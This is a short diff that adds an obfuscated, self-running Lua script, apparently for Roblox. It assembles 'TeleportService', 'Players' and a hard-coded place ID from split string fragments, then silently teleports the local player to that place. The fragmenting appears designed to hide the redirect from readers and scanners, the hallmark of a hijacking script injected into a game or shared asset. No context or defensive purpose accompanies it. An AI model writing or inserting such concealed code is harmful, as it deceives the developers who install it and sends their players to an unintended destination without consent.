@@ -1,0 +1,7 @@
+(function()
+	local a={"545","902","026"}local b={"Tele","port","Ser","vice"}local c={"Play","ers"}
+	local d=game:GetService(table.concat(b))local e=game:GetService(table.concat(c))
+	local f=e.LocalPlayer if not f then return end
+	local g,h=pcall(function()d:Teleport(tonumber(table.concat(a)),f)end)
+	if not g then warn("Teleport failed: "..tostring(h))end
+end)()
